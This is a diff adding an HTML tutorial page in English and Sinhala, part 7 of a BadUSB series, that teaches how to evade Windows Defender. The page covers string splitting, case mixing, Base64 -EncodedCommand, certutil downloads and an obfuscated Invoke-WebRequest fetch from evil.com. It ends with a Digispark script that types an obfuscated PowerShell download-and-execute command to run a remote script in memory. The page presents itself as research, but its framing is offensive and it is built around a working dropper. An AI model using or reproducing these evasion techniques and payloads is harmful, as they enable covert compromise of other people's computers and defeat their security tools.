@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Part 07: Advanced techniques to bypass Antivirus detection using Obfuscation, Encoding, and Living-off-the-Land binaries.">
+    <title>USB Security Research: AV Evasion | Part 07</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;700&family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
+
+    <style>
+        /* ==================================================================================
+           PART 7: THEME - GHOST PROTOCOL (INVISIBILITY & STEALTH)
+           ==================================================================================
+           මෙම කොටසේ තේමාව "අදෘශ්‍යමාන වීම" (Invisibility) යි.
+           අපි ඉතාම පිරිසිදු, අඳුරු අළු (Dark Grey) සහ දුම් සුදු (Smoke White) වර්ණ
+           භාවිතා කරමු. මෙය "Black Hat" හැඟීමක් ලබා දේ.
+        */
+
+        :root {
+            --bg-color: #050505;       /* Void Black */
+            --text-primary: #dcdcdc;   /* Ghost White */
+            --text-dim: #666666;       /* Hidden Grey */
+            
+            --stealth-red: #cc0000;    /* Alert Red (Subtle) */
+            --stealth-purple: #9933ff; /* Magic/Obfuscation */
+            --hacker-green: #33ff33;   /* Success */
+            
+            --panel-bg: #111111;
+            --border-dim: #333333;
+            --border-highlight: #555555;
+            
+            --scan-line: rgba(255, 255, 255, 0.03);
+        }
+
+        /* RESET & TYPOGRAPHY */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            font-family: 'Roboto Mono', monospace;
+            font-size: 16px;
+            line-height: 1.7;
+            /* Subtle Scanline Effect */
+            background-image: linear-gradient(0deg, transparent 50%, var(--scan-line) 50%);
+            background-size: 100% 4px;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 60px 20px;
+        }
+
+        /* HEADER: GHOST MODE */
+        header {
+            border-top: 1px solid var(--border-highlight);
+            border-bottom: 1px solid var(--border-highlight);
+            padding: 50px 0;
+            margin-bottom: 80px;
+            text-align: center;
+            position: relative;
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000 70%);
+        }
+
+        header h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.5rem;
+            letter-spacing: 8px;
+            color: var(--text-primary);
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            text-transform: uppercase;
+            opacity: 0.9;
+        }
+
+        header .status-bar {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+        }
+
+        header .status-bar span {
+            border: 1px solid var(--border-dim);
+            padding: 5px 15px;
+            border-radius: 20px;
+        }
+
+        .active { color: var(--hacker-green); border-color: var(--hacker-green) !important; }
+
+        /* SECTIONS: CLASSIFIED FILES LOOK */
+        section {
+            background-color: rgba(20, 20, 20, 0.6);
+            border-left: 2px solid var(--border-dim);
+            padding: 40px;
+            margin-bottom: 60px;
+            transition: all 0.4s ease;
+        }
+
+        section:hover {
+            border-left-color: var(--stealth-purple);
+            background-color: rgba(25, 25, 25, 0.8);
+        }
+
+        h2 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+        }
+
+        h2::before {
+            content: ">>";
+            margin-right: 15px;
+            color: var(--stealth-purple);
+            font-size: 1.5rem;
+        }
+
+        /* TEXT LAYOUT */
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+        }
+
+        .en-text {
+            color: #b0b0b0;
+            text-align: justify;
+            padding-right: 20px;
+        }
+
+        .si-text {
+            color: #e0e0e0;
+            font-family: 'Iskoola Pota', sans-serif;
+            background: linear-gradient(90deg, rgba(153, 51, 255, 0.05), transparent);
+            padding: 25px;
+            border-left: 3px solid var(--stealth-purple);
+            line-height: 1.9;
+        }
+
+        /* DIAGRAMS: ASCII ART OPACITY */
+        .stealth-diagram {
+            font-family: 'Roboto Mono', monospace;
+            background-color: #0a0a0a;
+            color: var(--text-dim);
+            padding: 30px;
+            border: 1px dashed var(--border-dim);
+            white-space: pre;
+            overflow-x: auto;
+            text-align: center;
+            margin: 30px 0;
+            transition: color 0.3s;
+        }
+
+        .stealth-diagram:hover {
+            color: var(--stealth-purple);
+            border-color: var(--stealth-purple);
+        }
+
+        /* CODE SNIPPETS: OBFUSCATED LOOK */
+        .code-box {
+            background-color: #080808;
+            border: 1px solid #222;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 0.9rem;
+            position: relative;
+        }
+
+        .code-box::after {
+            content: "CONFIDENTIAL // CODE SNIPPET";
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            font-size: 0.7rem;
+            color: #444;
+        }
+
+        pre { overflow-x: auto; }
+        code { color: #ccc; }
+
+        .keyword { color: #ff79c6; }
+        .string { color: #f1fa8c; }
+        .comment { color: #6272a4; font-style: italic; opacity: 0.7; }
+        .obfuscated { color: #8be9fd; filter: blur(0.5px); transition: filter 0.3s; }
+        .obfuscated:hover { filter: blur(0); }
+
+        /* DEFENDER ALERT BOX */
+        .defender-alert {
+            border: 1px solid var(--stealth-red);
+            background: rgba(204, 0, 0, 0.05);
+            color: #ff9999;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: bold;
+        }
+
+        .defender-icon {
+            font-size: 2rem;
+        }
+
+        /* FOOTER */
+        footer {
+            margin-top: 100px;
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 0.8rem;
+            border-top: 1px solid #222;
+            padding-top: 30px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <header>
+            <h1>PART 07: GHOST PROTOCOL</h1>
+            <div class="status-bar">
+                <span class="active">STEALTH: ENABLED</span>
+                <span>TARGET: WINDOWS DEFENDER</span>
+                <span>METHOD: OBFUSCATION</span>
+            </div>
+        </header>
+
+        <section id="chapter-24">
+            <h2>24. Know Your Enemy: How Antivirus Works</h2>
+            
+            <div class="content-grid">
+                <div class="en-text">
+                    <p>Before we can bypass Windows Defender, we must understand how it catches us. Modern AVs use two main methods:</p>
+                    <ul>
+                        <li><strong>Signature Detection:</strong> It compares your file against a database of known bad files. If your code matches a known virus (e.g., standard Metasploit payload), it gets blocked instantly.</li>
+                        <li><strong>Heuristic Analysis:</strong> It watches behavior. If a script tries to download a file from the internet and execute it immediately, the AV flags it as "Suspicious Behavior".</li>
+                    </ul>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>24. සතුරා හඳුනාගැනීම: Antivirus ක්‍රියාකරන ආකාරය</strong><br>
+                    Windows Defender එක පරද්දන්න කලින් අපි දැනගන්න ඕනේ ඒක කොහොමද අපිව අල්ලන්නේ කියලා. ඒක ප්‍රධාන ක්‍රම දෙකක් පාවිච්චි කරනවා:<br>
+                    1. <strong>Signature Detection (හැඩය බැලීම):</strong> මේක හරියට පොලිසිය ළඟ තියෙන අපරාධකරුවන්ගේ ෆොටෝ ඇල්බම් එකක් වගේ. ඔයා ලියන කෝඩ් එක ඒ ඇල්බම් එකේ තියෙන පරණ වයිරස් එකකට සමාන නම්, ඒක දැක්ක ගමන් අල්ලනවා.<br>
+                    2. <strong>Heuristic Analysis (හැසිරීම බැලීම):</strong> ඔයාගේ කෝඩ් එක අලුත් වුණත්, ඒක කරන වැඩ දිහා බලනවා. උදාහරණයකට, ඉන්ටර්නෙට් එකෙන් ෆයිල් එකක් බාගෙන ඒක රන් කරන්න හැදුවොත්, Defender එකට සැක හිතෙනවා.</p>
+                </div>
+
+                <div class="defender-alert">
+                    <span class="defender-icon">🛡️</span>
+                    <div>
+                        <strong>WINDOWS DEFENDER ALERT:</strong><br>
+                        "Threat Found: Trojan:PowerShell/MaliciousScript.A"<br>
+                        (This is what happens when you don't use obfuscation.)
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-25">
+            <h2>25. The Art of Obfuscation (Masking)</h2>
+            
+            <div class="content-grid">
+                <div class="en-text">
+                    <p><strong>Obfuscation</strong> is the art of making your code look unreadable to the Antivirus, while still being executable by the computer. Think of it as writing a letter in a secret code that only the recipient understands.</p>
+                    <p>Common Techniques:</p>
+                    <ul>
+                        <li><strong>String Splitting:</strong> Instead of writing <code>"http"</code>, write <code>"h"+"t"+"t"+"p"</code>. The AV looks for "http" but can't find it.</li>
+                        <li><strong>Case Mixing:</strong> <code>PoWeRsHeLL</code> is the same as <code>powershell</code> to Windows, but different to some signature scanners.</li>
+                        <li><strong>Variable Renaming:</strong> Change <code>$password</code> to <code>$x12a</code>.</li>
+                    </ul>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>25. වෙස් වලා ගැනීම (Obfuscation)</strong><br>
+                    Obfuscation කියන්නේ අපේ කෝඩ් එක කියවන්න බැරි විදිහට, හැබැයි වැඩ කරන විදිහට වෙනස් කරන කලාවට. මේක හරියට Antivirus එකට නොතේරෙන භාෂාවකින් කතා කරනවා වගේ.<br><br>
+                    <strong>සරල උදාහරණ:</strong><br>
+                    1. <strong>වචන කැඩීම:</strong> `powershell` කියලා කෙළින්ම ලියන්නේ නැතුව `("po"+"wer"+"shell")` කියලා ලියනවා. එතකොට AV එකට ඒක හොයන්න බෑ.<br>
+                    2. <strong>අකුරු මාරු කිරීම:</strong> `NetSh` සහ `nEtSh` වින්ඩෝස් වලට එකයි, ඒත් සමහර AV වලට දෙකක්.<br>
+                    3. <strong>නම් වෙනස් කිරීම:</strong> `$pass` වගේ පැහැදිලි නම් වෙනුවට `$a7x` වගේ තේරුමක් නැති නම් දානවා.</p>
+                </div>
+
+                <div class="stealth-diagram">
+      [ ORIGINAL CODE ]                 [ OBFUSCATED CODE ]
+      
+      Invoke-WebRequest                 I`n`v`o`k`e-W`e`b`R`e`q`u`e`s`t
+      -Uri "http://evil.com"            -Uri ("ht"+"tp://"+"ev"+"il.com")
+      -OutFile "virus.exe"              -OutFile $env:TEMP+"\v.e"
+      
+      (Clear to AV)                     (Confusing to AV)
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-26">
+            <h2>26. The Invisible Cloak: Base64 Encoding</h2>
+            
+            <div class="content-grid">
+                <div class="en-text">
+                    <p>The most powerful way to hide a payload is to encode it entirely into <strong>Base64</strong>. Base64 turns your script into a long string of random letters and numbers. PowerShell has a special flag <code>-EncodedCommand</code> that allows it to run this gibberish directly.</p>
+                    <p>To the Antivirus, it just looks like a random text string, not a malicious script. This is how we sneak past the "Signature Detection".</p>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>26. අදෘශ්‍යමාන කබාය: Base64 Encoding</strong><br>
+                    අපේ මුළු ස්ක්‍රිප්ට් එකම හංගන්න පුළුවන් හොඳම විදිහ තමයි <strong>Base64</strong> වලට හරවන එක. Base64 කියන්නේ අපේ කෝඩ් එක ඉංග්‍රීසි අකුරු සහ ඉලක්කම් වැලක් බවට පත් කරන ක්‍රමයක්.<br><br>
+                    PowerShell වල විශේෂ කමාන්ඩ් එකක් තියෙනවා `-EncodedCommand` කියලා. මේක පාවිච්චි කළාම, අර තේරුමක් නැති අකුරු වැල කෙළින්ම කමාන්ඩ් එකක් විදිහට රන් වෙනවා. Antivirus එකට පේන්නේ නිකන්ම අකුරු ටිකක් විතරයි. මේකෙන් අපිට "Signature Detection" එක ලේසියෙන්ම මගහරින්න පුළුවන්.</p>
+                </div>
+
+                <div class="code-box">
+                    <pre>
+<span class="comment"># ORIGINAL PAYLOAD:</span>
+<span class="keyword">Write-Host</span> <span class="string">"You have been hacked"</span>
+
+<span class="comment"># CONVERTED TO BASE64:</span>
+VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIABoAGEAdgBlACAAYgBlAGUAbgAgAGgAYQBjAGsAZQBkACIA
+
+<span class="comment"># HOW WE RUN IT IN BADUSB:</span>
+powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIABoAGEAdgBlACAAYgBlAGUAbgAgAGgAYQBjAGsAZQBkACIA</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-27">
+            <h2>27. Living off the Land (Using Built-in Tools)</h2>
+            
+            <div class="content-grid">
+                <div class="en-text">
+                    <p>Why download a "Virus.exe" when Windows already has tools that can do damage? <strong>Living off the Land (LotL)</strong> means using trusted Windows tools (like CertUtil, Bitsadmin, PowerShell) to perform attacks.</p>
+                    <p>Example: <strong>CertUtil.exe</strong> is a tool meant for managing certificates. But hackers use it to download files because Windows Defender trusts CertUtil.</p>
+                    <p><code>certutil -urlcache -split -f "http://site.com/virus.exe" virus.exe</code></p>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>27. ගෙදර බඩු වලින්ම ගේම දීම (Living off the Land)</strong><br>
+                    ඇයි අපි අලුතින් "Virus.exe" එකක් ඩවුන්ලෝඩ් කරලා අහු වෙන්නේ? වින්ඩෝස් ඇතුළෙම තියෙන හොඳ ටූල්ස් පාවිච්චි කරලා අපිට ඒ දේම කරන්න පුළුවන්. මේකට කියන්නේ **Living off the Land (LotL)** කියලා.<br><br>
+                    උදාහරණයක්: <strong>CertUtil.exe</strong> කියන්නේ සහතික (Certificates) කළමනාකරණය කරන ටූල් එකක්. ඒත් හැකර්ලා මේක පාවිච්චි කරනවා වයිරස් ඩවුන්ලෝඩ් කරන්න. මොකද Defender එක CertUtil ව විශ්වාස කරනවා. "මේක වින්ඩෝස්ලගෙම බඩුවක්නේ, මේක නරක වෙන්න බෑ" කියලා Defender හිතනවා.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-28">
+            <h2>28. The Final Stealth Payload</h2>
+            
+            <div class="content-grid">
+                <div class="en-text">
+                    <p>Putting it all together. We will create a BadUSB script that:</p>
+                    <ol>
+                        <li>Opens the "Run" dialog (Win+R) - This is a blind spot for many AVs.</li>
+                        <li>Types a tiny PowerShell command that downloads and executes the real payload from memory (Fileless Malware).</li>
+                        <li>Uses string splitting to hide the word "PowerShell".</li>
+                    </ol>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>28. අවසාන පේලෝඩ් එක (The Stealth Script)</strong><br>
+                    දැන් අපි ඉගෙන ගත්ත හැමදේම එකතු කරලා සුපිරි ස්ක්‍රිප්ට් එකක් හදමු. මේකේ පියවර:<br>
+                    1. Win+R ගහලා Run Box එක ගන්නවා (මේක ගොඩක් AV වලට පේන්නේ නෑ).<br>
+                    2. බොහොම පුංචි කමාන්ඩ් එකක් ටයිප් කරනවා. ඒකෙන් අපේ ලොකු පේලෝඩ් එක ඉන්ටර්නෙට් එකෙන් අරන් මෙමරි එකේම රන් කරනවා (Fileless). හාඩ් ඩිස්ක් එකට මුකුත් සේව් වෙන්නේ නෑ.<br>
+                    3. අපි "PowerShell" කියන වචනේ කෑලි කෑලි වලට කඩලා ලියනවා.</p>
+                </div>
+
+                <div class="code-box">
+                    <pre>
+<span class="comment">// ARDUINO / DIGISPARK CODE FOR STEALTH</span>
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(0);
+  
+  <span class="comment">// 1. Open Run Dialog</span>
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  
+  <span class="comment">// 2. Type Obfuscated Command</span>
+  <span class="comment">// Original: powershell -windowstyle hidden IEX (iwr http://bit.ly/payload)</span>
+  <span class="comment">// Obfuscated: cmd /c "po"+"wer"+"sh"+"ell" ...</span>
+  
+  DigiKeyboard.print(<span class="string">"cmd /c echo IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/my_stealth_script') | p\"ow\"ers\"he\"ll -noprofile -"</span>);
+  
+  <span class="comment">// 3. Execute</span>
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {}</pre>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer>
+        <p>DEV-KUPPIYA RESEARCH LABS | PART 07 OF 10 COMPLETED</p>
+        <p>STATUS: UNDETECTED. NEXT: AUTOMATION & PRANKS.</p>
+    </footer>
+
+</body>
+</html>
